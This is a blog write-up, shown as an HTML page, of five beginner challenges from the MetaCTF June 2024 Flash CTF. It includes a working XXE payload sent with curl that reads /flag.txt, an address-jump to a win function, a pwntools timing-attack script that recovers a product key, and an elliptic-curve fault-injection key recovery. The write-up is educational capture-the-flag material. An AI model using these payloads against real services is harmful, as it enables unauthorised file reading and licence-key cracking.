@@ -1,0 +1,140 @@
+<!doctype html><html data-theme=dark lang=en xmlns=http://www.w3.org/1999/xhtml><head><meta charset=UTF-8><meta name=description><meta content="width=device-width,initial-scale=1" name=viewport><meta content=#9a9996 name=theme-color><meta content=#20c20e media=(prefers-color-scheme:dark) name=theme-color><title>️🏴 MetaCTF June 2024 Flash CTF - psypherpunk::blog</title><link href=https://blog.psypherpunk.io/blog/metactf-june-2024-flash-ctf/ rel=canonical><link href=https://blog.psypherpunk.io/favicon.png rel=icon type=image/png><link href=https://blog.psypherpunk.io/apple-touch-icon.png rel=apple-touch-icon sizes=180x180 type=image/png><link title="psypherpunk::blog - RSS Feed" href=https://blog.psypherpunk.io/rss.xml rel=alternate type=application/rss+xml><link title="psypherpunk::blog - Atom Feed" href=https://blog.psypherpunk.io/atom.xml rel=alternate type=application/atom+xml><style>:root{--accent-color:#6f8396}[data-theme=dark]{--accent-color:#20c20e}@media (prefers-color-scheme:dark){:root:not([data-theme=light]){--accent-color:#20c20e}}</style><link href=https://blog.psypherpunk.io/style.css rel=stylesheet><script defer src=https://blog.psypherpunk.io/closable.js></script><meta content=psypherpunk::blog property=og:site_name><meta content="️🏴 MetaCTF June 2024 Flash CTF - psypherpunk::blog" property=og:title><meta content=https://blog.psypherpunk.io/blog/metactf-june-2024-flash-ctf/ property=og:url><meta content="A monthly mini CTF competition organized by MetaCTF and Antisyphon." property=og:description><meta content=https://blog.psypherpunk.io/card.png property=og:image><meta content=en_US property=og:locale><body><header id=site-nav><nav><a href=#main-content tabindex=0> Skip to Main Content </a><ul><li id=home><a href=https://blog.psypherpunk.io> <i class=icon></i>psypherpunk::blog</a><li class=divider><li><a href=https://blog.psypherpunk.io/blog/>Blog</a><li id=feed><details class=closable><summary class=circle title=Feed><i class=icon></i></summary> <ul><li><a href=https://blog.psypherpunk.io/rss.xml>RSS</a><li><a href=https://blog.psypherpunk.io/atom.xml>Atom</a></ul></details></ul></nav></header><main id=main-content><article><div id=heading><p><small> <time datetime=" 2024-06-21T00:00:00+00:00">Published on June 21, 2024</time></small><h1>️🏴 MetaCTF June 2024 Flash CTF</h1><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/tags/ctf/>ctf</a></ul><ul class=tags><li><a class=tag href=https://blog.psypherpunk.io/categories/ctf/>ctf</a></ul></div><div id=buttons-container><a title="Go to Top" href=#top id=go-to-top><i class=icon></i></a></div><blockquote><p><em>A monthly mini CTF competition organized by MetaCTF with support from Antisyphon Training and TCM Security. There will be 5 challenges and you will have 2 hours to solve as many as you can. This is a beginner-friendly CTF.</em></blockquote><p>Details here: <a href=https://app.metactf.com/join/jun2024>https://app.metactf.com/join/jun2024</a>.</p><span id=continue-reading></span><h2 id=anonymoose>Anonymoose</h2><blockquote><p><em>Your anonymous music producer friend (D34DM0053) is getting ready to publish an open letter on mental health in the music industry, but they don’t know much about computers. Can you help double check their letter to make sure it isn’t leaking their identity?</em><p><em><a href=https://metaproblems.com/0778e85952c806a4f55fb61d12fd8ca0/D34DM0053_Open_Letter_Mental_Health.pdf>Here’s the letter in question.</a></em></blockquote><p>Things are off to a flying start as the flag is right there in the PDF’s metadata:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> pdfinfo D34DM0053_Open_Letter_Mental_Health.pdf
+</span><span style=color:#bf616a>Author:</span><span>          MetaCTF{Wren_Gaillard}
+</span><span style=color:#bf616a>Creator:</span><span>         Writer
+</span><span style=color:#bf616a>Producer:</span><span>        OpenOffice 4.1.15
+</span><span style=color:#bf616a>CreationDate:</span><span>    Tue Jun 11 17:42:36 2024 BST
+</span><span style=color:#bf616a>Custom</span><span> Metadata: no
+</span><span style=color:#bf616a>Metadata</span><span> Stream: yes
+</span><span style=color:#bf616a>Tagged:</span><span>          no
+</span><span style=color:#bf616a>UserProperties:</span><span>  no
+</span><span style=color:#bf616a>Suspects:</span><span>        no
+</span><span style=color:#bf616a>Form:</span><span>            none
+</span><span style=color:#bf616a>JavaScript:</span><span>      no
+</span><span style=color:#bf616a>Pages:</span><span>           1
+</span><span style=color:#bf616a>Encrypted:</span><span>       no
+</span><span style=color:#bf616a>Page</span><span> size:       612 x 792 pts (letter)
+</span><span style=color:#bf616a>Page</span><span> rot:        0
+</span><span style=color:#bf616a>File</span><span> size:       128361 bytes
+</span><span style=color:#bf616a>Optimized:</span><span>       no
+</span></code></pre><h2 id=where-we-jmping>Where We JMPing</h2><blockquote><p><em>Quick, we need to pick a place to JMP to! Can your tremendous strategy get us the win?</em><p><em>Connect via <code>nc kubenode.mctf.io 30006</code> and find out.</em><p><em>You can grab the <a href=http://metaproblems.com/d7b1bc353806df056180404b80955245/where_we_jmping>binary here</a>. Good luck!</em></blockquote><p>Loading the provided <code>where_we_jmping</code> binary into <a href=https://dogbolt.org/>Decompiler Explore</a>, there’s this in Hex-Rays:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#65737e>//----- (00000000004011A6) ----------------------------------------------------
+</span><span style=color:#b48ead>int </span><span style=color:#8fa1b3>win</span><span>()
+</span><span>{
+</span><span>  </span><span style=color:#b48ead>char</span><span> v1; </span><span style=color:#65737e>// [rsp+7h] [rbp-9h]
+</span><span>  FILE *stream; </span><span style=color:#65737e>// [rsp+8h] [rbp-8h]
+</span><span>
+</span><span>  stream = </span><span style=color:#96b5b4>fopen</span><span>("</span><span style=color:#a3be8c>flag.txt</span><span>", "</span><span style=color:#a3be8c>r</span><span>");
+</span><span>  </span><span style=color:#b48ead>if </span><span>( !stream )
+</span><span>    </span><span style=color:#b48ead>return </span><span style=color:#96b5b4>puts</span><span>("</span><span style=color:#a3be8c>Error: Could not find 'flag.txt'</span><span>");
+</span><span>  </span><span style=color:#96b5b4>puts</span><span>("</span><span style=color:#a3be8c>Contents of 'flag.txt':</span><span>");
+</span></code></pre><p>That <code>00000000004011A6</code> is the offset of this function:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> nc kubenode.mctf.io 30006
+</span><span style=color:#bf616a>Enter</span><span> a memory address to jump to (as a hexadecimal, e.g., 0x401222)</span><span style=color:#96b5b4>:</span><span> 0x4011A6
+</span><span style=color:#bf616a>Jumping</span><span> to address 0x4011a6!
+</span><span style=color:#bf616a>Contents</span><span> of '</span><span style=color:#a3be8c>flag.txt</span><span>':
+</span><span style=color:#bf616a>MetaCTF{jmp1ng_t0_th3_g00d_l00t</span><span>}
+</span></code></pre><h2 id=dot-matrix-destruction>Dot-Matrix Destruction</h2><blockquote><p><em>I wanted to buy one of those squeaky old printers from this vintage printer company, but they’re all so overpriced. Forget that. Can you just have them print out the flag for us?</em><p><em>The flag is at <code>/flag.txt</code>.</em></blockquote><p>The challenge spawns a container at <code>http://py42aoqa.chals.mctf.io/</code>. There’s no obvious SQLi or similar but the input is XML so…XXE time!<p>There’s a fairly standard LFI via XXE. That allows files to be <em>read</em> but how to actual present the contents of that file? Thankfully, if an invalid <code>&lt;country></code> element is passed, the invalid data are presented in the resulting error message, allowing the LFI to be similarly displayed:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>curl</span><span> http://py42aoqa.chals.mctf.io/api/search_printers \
+</span><span style=color:#bf616a>    --silent </span><span>\
+</span><span style=color:#bf616a>    --include </span><span>\
+</span><span style=color:#bf616a>    --request</span><span> POST \
+</span><span style=color:#bf616a>    --header </span><span>'</span><span style=color:#a3be8c>Content-Type: text/plain;charset=UTF-8</span><span>' \
+</span><span style=color:#bf616a>    --data </span><span>$'
+</span><span style=color:#a3be8c>&lt;!--?xml version="1.0" ?-->
+</span><span style=color:#a3be8c>&lt;!DOCTYPE foo [&lt;!ENTITY ctf SYSTEM "/flag.txt"> ]>
+</span><span style=color:#a3be8c>&lt;query>&lt;search>3&lt;/search>&lt;country>&ctf;&lt;/country>&lt;/query></span><span>'
+</span><span style=color:#bf616a>HTTP/1.1</span><span> 200 OK
+</span><span style=color:#bf616a>Date:</span><span> Fri, 21 Jun 2024 18:05:56 GMT
+</span><span style=color:#bf616a>Content-Type:</span><span> text/html; </span><span style=color:#bf616a>charset</span><span>=</span><span style=color:#a3be8c>utf-8
+</span><span style=color:#bf616a>Content-Length:</span><span> 123
+</span><span style=color:#bf616a>Connection:</span><span> keep-alive
+</span><span>
+</span><span>
+</span><span>        &lt;error>The </span><span style=color:#bf616a>country</span><span> code MetaCTF{y3ah_xxe_d0e5_r0ck_d0esnt_it?}
+</span><span> </span><span style=color:#bf616a>is</span><span> not a recognized country code.&lt;/error>
+</span></code></pre><h2 id=clock-out>Clock Out</h2><blockquote><p><em>I’m trying to crack this timecard software so I can <em>illegally</em> use it for free. Pls Help!</em><p><em>Grab the binary <a href=https://metaproblems.com/7844b782a8488bf31e5ce61c2597494b/clock_out>here</a>.</em></blockquote><p>When run, the provided <code>clock_out</code> binary prompts for a product key. There are some initial checks (like the flag being exactly 22 characters), then each character of the input value is hashed:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>    </span><span style=color:#b48ead>while </span><span>(</span><span style=color:#d08770>true</span><span>)
+</span><span>    {
+</span><span>        v4 = </span><span style=color:#d08770>0</span><span>;
+</span><span>        v3 = *((</span><span style=color:#b48ead>char </span><span>*)v11);
+</span><span>        </span><span style=color:#bf616a>SHA256_Init</span><span>(&v2);
+</span><span>        </span><span style=color:#bf616a>SHA256_Update</span><span>(&v2, v0, </span><span style=color:#d08770>1</span><span>);
+</span><span>        </span><span style=color:#bf616a>SHA256_Final</span><span>(v1, &v2);
+</span><span>        </span><span style=color:#b48ead>if </span><span>(*((</span><span style=color:#b48ead>int </span><span>*)v12) != *((</span><span style=color:#b48ead>int </span><span>*)&v5))
+</span><span>        {
+</span><span>            v12 += </span><span style=color:#d08770>4</span><span>;
+</span><span>            v9 -= </span><span style=color:#d08770>8</span><span>;
+</span><span>            v11 += </span><span style=color:#d08770>1</span><span>;
+</span><span>            </span><span style=color:#bf616a>usleep</span><span>(</span><span style=color:#d08770>0x64</span><span>);
+</span><span>            </span><span style=color:#b48ead>if </span><span>(v12 == v10)
+</span><span>                </span><span style=color:#b48ead>return </span><span>!v9;
+</span><span>        }
+</span><span>        </span><span style=color:#b48ead>else
+</span><span>        {
+</span><span>            v12 += </span><span style=color:#d08770>4</span><span>;
+</span><span>            v9 -= </span><span style=color:#d08770>16</span><span>;
+</span><span>            v11 += </span><span style=color:#d08770>1</span><span>;
+</span><span>            </span><span style=color:#bf616a>usleep</span><span>(</span><span style=color:#d08770>0x2710</span><span>);
+</span><span>            </span><span style=color:#b48ead>if </span><span>(v12 == v10)
+</span><span>                </span><span style=color:#b48ead>return </span><span>!v9;
+</span><span>        }
+</span><span>    }
+</span></code></pre><p>Depending on whether the hashed character is in a pre-existing list of hashes, it sleeps for a different duration: it’s a timing attack.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>sys
+</span><span style=color:#b48ead>import </span><span>time
+</span><span>
+</span><span style=color:#b48ead>from </span><span>pwn </span><span style=color:#b48ead>import </span><span>context, process
+</span><span>
+</span><span>
+</span><span>context.binary = "</span><span style=color:#a3be8c>./clock_out</span><span>"
+</span><span>context.log_level = "</span><span style=color:#a3be8c>error</span><span>"
+</span><span>
+</span><span>
+</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>run_proc</span><span>(</span><span style=color:#bf616a>cmd</span><span>, </span><span style=color:#bf616a>product_key</span><span>):
+</span><span>    p = </span><span style=color:#bf616a>process</span><span>()
+</span><span>    p.</span><span style=color:#bf616a>readuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Enter your Product Key</span><span style=color:#96b5b4>\n\n</span><span>")
+</span><span>    p.</span><span style=color:#bf616a>sendline</span><span>(product_key.</span><span style=color:#bf616a>encode</span><span>())
+</span><span>    </span><span style=color:#bf616a>_ </span><span>= p.</span><span style=color:#bf616a>readline</span><span>()
+</span><span>    p.</span><span style=color:#bf616a>close</span><span>()
+</span><span>
+</span><span>
+</span><span>flag = "</span><span style=color:#a3be8c>MetaCTF{</span><span>"
+</span><span>
+</span><span style=color:#b48ead>while </span><span>not flag.</span><span style=color:#bf616a>endswith</span><span>("</span><span style=color:#a3be8c>}</span><span>"):
+</span><span>    timings = </span><span style=color:#bf616a>list</span><span>()
+</span><span>    </span><span style=color:#b48ead>for </span><span>c </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>33</span><span>, </span><span style=color:#d08770>127</span><span>):
+</span><span>        sys.stdout.</span><span style=color:#bf616a>write</span><span>(flag + </span><span style=color:#96b5b4>chr</span><span>(c) + "</span><span style=color:#96b5b4>\r</span><span>")
+</span><span>        sys.stdout.</span><span style=color:#bf616a>flush</span><span>()
+</span><span>
+</span><span>        product_key = flag + </span><span style=color:#96b5b4>chr</span><span>(c) + "</span><span style=color:#a3be8c>#</span><span>" * (</span><span style=color:#d08770>22 </span><span>- (</span><span style=color:#96b5b4>len</span><span>(flag) + </span><span style=color:#d08770>1</span><span>))
+</span><span>
+</span><span>        start = time.</span><span style=color:#bf616a>time</span><span>()
+</span><span>        p = </span><span style=color:#bf616a>process</span><span>()
+</span><span>        p.</span><span style=color:#bf616a>readuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Enter your Product Key</span><span style=color:#96b5b4>\n\n</span><span>")
+</span><span>        p.</span><span style=color:#bf616a>sendline</span><span>(product_key.</span><span style=color:#bf616a>encode</span><span>())
+</span><span>        </span><span style=color:#bf616a>_ </span><span>= p.</span><span style=color:#bf616a>readline</span><span>()
+</span><span>        p.</span><span style=color:#bf616a>close</span><span>()
+</span><span>        duration = time.</span><span style=color:#bf616a>time</span><span>() - start
+</span><span>
+</span><span>        timings.</span><span style=color:#bf616a>append</span><span>((c, duration))
+</span><span>
+</span><span>    (c, </span><span style=color:#bf616a>_</span><span>), *</span><span style=color:#bf616a>_ </span><span>= </span><span style=color:#96b5b4>sorted</span><span>(timings, </span><span style=color:#bf616a>key</span><span>=</span><span style=color:#b48ead>lambda </span><span style=color:#bf616a>t</span><span>: t[</span><span style=color:#d08770>1</span><span>], </span><span style=color:#bf616a>reverse</span><span>=</span><span style=color:#d08770>True</span><span>)
+</span><span>    flag += </span><span style=color:#96b5b4>chr</span><span>(c)
+</span><span>    sys.stdout.</span><span style=color:#bf616a>write</span><span>(flag + "</span><span style=color:#96b5b4>\r</span><span>")
+</span><span>
+</span><span style=color:#96b5b4>print</span><span>(flag)
+</span></code></pre><p>After a while:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> python3 clock_out.py
+</span><span style=color:#bf616a>MetaCTF{time-</span><span>>tm_hour}
+</span></code></pre><h2 id=faulty-curves>Faulty Curves</h2><blockquote><p><em>There’s something wrong with my decryptor… Download the source code <a href=https://metaproblems.com/d0e9282c1182fa983b6971906d80f0ca/FaultyCurves.zip>here</a>.</em></blockquote><p>The function naming here is fairly kind: it’s using Elliptic Curve Cryptography but, by virtue of the <code>fault()</code> function, is adding “faults” into the private key (<code>my_priv</code>). Specifically, it’s flipping bits.<p>For every bit in the private key, it:<ul><li>generates a random message point <code>M</code> on the curve and stores it;<li>computes encrypted points, <code>C1</code> and <code>C2</code>;<li>injects a fault into the private key by flipping a bit;<li>uses the new, faulty private key to decrypt <code>C2</code>.</ul><p>To reverse this, given <code>ms</code>, <code>C1s</code>, <code>C2s</code> and <code>decs</code> as per the <code>out.txt</code> file, it should be possible to:<ul><li>convert the stored coordinates back to their Elliptic Curve points;<li>determine the difference between the decrypted point and the message point;<li>calculate the point product for the current bit;<li>from that, determine whether the bit should be a <code>1</code> or <code>0</code>.</ul><p>I admit that I barely understand that; I’ve a lot of reading to do…<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>for </span><span>bit_position </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#96b5b4>len</span><span>(ms)):
+</span><span>    message_point = </span><span style=color:#bf616a>E</span><span>(ms[bit_position])
+</span><span>    C1_point = </span><span style=color:#bf616a>E</span><span>(C1s[bit_position])
+</span><span>    C2_point = </span><span style=color:#bf616a>E</span><span>(C2s[bit_position])
+</span><span>    decrypted_point = </span><span style=color:#bf616a>E</span><span>(decs[bit_position])
+</span><span>    
+</span><span>    difference = decrypted_point - message_point
+</span><span>    
+</span><span>    point_product = C1_point * (</span><span style=color:#d08770>2 </span><span>** bit_position)
+</span><span>    
+</span><span>    </span><span style=color:#b48ead>if </span><span>point_product == difference:
+</span><span>        reconstructed_priv_key_bits += "</span><span style=color:#a3be8c>1</span><span>"
+</span><span>    </span><span style=color:#b48ead>else</span><span>:
+</span><span>        reconstructed_priv_key_bits += "</span><span style=color:#a3be8c>0</span><span>"
+</span></code></pre><p><code>reconstructed_priv_key_bits</code> at this point is backwards due to the way it was processed but thankfully:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>private_key = </span><span style=color:#bf616a>int</span><span>(reconstructed_priv_key_bits[::-</span><span style=color:#d08770>1</span><span>], </span><span style=color:#d08770>2</span><span>)
+</span><span style=color:#96b5b4>print</span><span>(</span><span style=color:#bf616a>long_to_bytes</span><span>(reconstructed_priv_key_bits).</span><span style=color:#bf616a>decode</span><span>())
+</span></code></pre><p>…which gives:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>MetaCTF{F4ult_1nj3ect10n_FTW</span><span>}
+</span></code></pre></article><hr><nav id=post-nav><a class="post-nav-item post-nav-prev" href=https://blog.psypherpunk.io/blog/metactf-may-2024-flash-ctf/> <div class=nav-arrow>Previous</div> <span class=post-title>️🏴 MetaCTF May 2024 Flash CTF</span> </a><a class="post-nav-item post-nav-next" href=https://blog.psypherpunk.io/blog/metactf-july-2024-flash-ctf/> <div class=nav-arrow>Next</div> <span class=post-title>️🏴 MetaCTF July 2024 Flash CTF</span> </a></nav></main><footer id=site-footer><nav><ul><li><a href=https://blog.psypherpunk.io/blog/>Blog</a></ul></nav><p>© 2025 PsypherPunk<ul id=socials><li><a rel=" me" href=https://github.com/PsypherPunk title=GitHub> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EGitHub%3C/title%3E%3Cpath d='M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>GitHub</span> </a><li><a rel=" me" href=https://hachyderm.io/@psypherpunk title=Mastodon> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EMastodon%3C/title%3E%3Cpath d='M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Mastodon</span> </a><li><a rel=" me" href=https://twitter.com/PsypherPunk title=Twitter> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ETwitter%3C/title%3E%3Cpath d='M21.543 7.104c.015.211.015.423.015.636 0 6.507-4.954 14.01-14.01 14.01v-.003A13.94 13.94 0 0 1 0 19.539a9.88 9.88 0 0 0 7.287-2.041 4.93 4.93 0 0 1-4.6-3.42 4.916 4.916 0 0 0 2.223-.084A4.926 4.926 0 0 1 .96 9.167v-.062a4.887 4.887 0 0 0 2.235.616A4.928 4.928 0 0 1 1.67 3.148 13.98 13.98 0 0 0 11.82 8.292a4.929 4.929 0 0 1 8.39-4.49 9.868 9.868 0 0 0 3.128-1.196 4.941 4.941 0 0 1-2.165 2.724A9.828 9.828 0 0 0 24 4.555a10.019 10.019 0 0 1-2.457 2.549z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Twitter</span> </a></ul></footer>
